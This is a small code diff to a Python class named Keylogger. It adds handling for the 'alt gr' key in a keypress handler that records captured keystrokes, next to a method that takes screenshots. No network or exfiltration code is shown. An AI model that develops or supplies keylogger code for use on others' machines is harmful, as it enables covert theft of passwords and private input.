@@ -69,6 +69,8 @@ class Keylogger(object):
         return screenshot
 
     def _on_key_press(self, event):
+        if event.name == 'alt gr':
+            event.name = 'alt'
         if len(event.name) > 1:
             event.name = '[{}]'.format(event.name)
         self.captured_keys.append(event.name)
